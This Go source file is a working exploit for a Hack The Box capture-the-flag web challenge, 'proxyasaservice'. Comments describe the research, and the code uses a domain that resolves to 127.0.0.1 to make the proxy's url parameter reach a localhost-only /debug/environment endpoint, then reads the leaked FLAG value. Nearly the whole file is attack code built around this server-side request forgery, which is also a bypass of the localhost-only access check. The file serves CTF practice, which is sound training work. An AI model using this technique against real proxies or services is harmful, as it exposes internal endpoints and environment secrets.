// exploit for https://app.hackthebox.com/challenges/proxyasaservice

/* objective:

get the flag

research:

after downloading the zipped contents, it appears in routes.py:31
there's a debug endpoint available at /debug/environment that will return a json
object of the app's environment. DockerfileL32 also shows and ENV key named FLAG
is present. So, I'll need to exploit the debug endpoint for it to respond with
the contents of the environment.

obstacles:

1. it appears the debug endpoint has a decorator `is_from_localhost` defined
in util.pyL12. the debug endpoint will only be available on the localhost.

2. the default Go http client doesn't allow for setting the remote address
because of SSRF reasons. need to write my own client and be able to set
the Remote Address header manually.

3.
*/

package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
)

func checkDNS(hostName string) error {

	// resolve the DNS name to a slice of ip addresses
	ipAddresses, err := net.LookupIP(hostName)
	if err != nil {
		fmt.Println("error:", err)
		return err
	}

	for _, ipAddress := range ipAddresses {
		fmt.Printf("resolved ip: %s\n", ipAddress)
	}

	// check if any of the resolved IPs is 127.0.0.1
	foundLocalhost := false
	for _, ipAddress := range ipAddresses {
		if ipAddress.String() == "127.0.0.1" {
			foundLocalhost = true
			break
		}
	}

	if !foundLocalhost {
		return fmt.Errorf("did not find 127.0.0.1 in: %v", hostName)
	}

	return nil
}

func main() {
	// cli flags to point to target host since HTB's endpoints
	// are spun up on demand.
	domain := flag.String("domain", "reddit.com2.golden2.store", "Domain to check DNS resolution to '127.0.0.1'")
	host := flag.String("host", "localhost", "Hostname or IP address")
	port := flag.String("port", "30815", "Port number")
	vulPort := flag.String("vulport", "1337", "Port number of the vulnerable Docker container")

	// parse the command-line flags asdf
	flag.Parse()

	// // convert the pointers
	exploitDomain := fmt.Sprintf("%v", *domain)
	serverHost := fmt.Sprintf("%v", *host)
	serverPort := fmt.Sprintf("%v", *port)
	vulnerablePort := fmt.Sprintf("%v", *vulPort)

	fmt.Println("received flags:", exploitDomain, serverHost, serverPort, vulnerablePort)

	err := checkDNS(exploitDomain)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	fmt.Println("DNS resolves to 127.0.0.1. Running exploit")

	// exploiting this endpoint that will show the env's information
	// and where the flag is. source: routes.pyL31. This endpoint is
	// protected by a decorator that only accepts connections from
	// 127.0.0.1
	serverEndpoint := "/debug/environment"

	vulnerableURL := "http://" + serverHost + ":" + serverPort + "/?url=" + exploitDomain + ":" + vulnerablePort + serverEndpoint

	exploit(vulnerableURL)
}

type PwnedResponse struct {
	EnvironmentVariables struct {
		Flag string `json:"FLAG"`
	} `json:"Environment variables"`
}

func exploit(vulnerableURL string) {
	// creating a custom http client since the default Go http won't
	// let me override the Request.RemoteAddr field. the vulnerable
	// app's utils.pyL12 shows a decorator that will only accept connections
	// from localhost. This will allow me to set a custom "Remote Address"
	// header

	fmt.Println("vulnerable url built: ", vulnerableURL)

	// Create an HTTP client
	client := &http.Client{}

	// Create an HTTP request
	req, err := http.NewRequest("GET", vulnerableURL, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	// Set custom headers in the request
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "close")
	req.Header.Set("User-Agent", "MyCustomUserAgent")
	// Send the HTTP request
	response, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
	defer response.Body.Close()

	// Check if the response status code is OK (200)
	if response.StatusCode != http.StatusOK {
		fmt.Printf("Response Status Code: %d\n", response.StatusCode)
		return
	}

	// Read and print the response body
	body, err := io.ReadAll(response.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		return
	}

	var pr PwnedResponse
	err = json.Unmarshal(body, &pr)
	if err != nil {
		fmt.Println("Error unmarshalling JSON:", err)
		return
	}

	fmt.Printf("Flag: %v\n", pr.EnvironmentVariables.Flag)
}
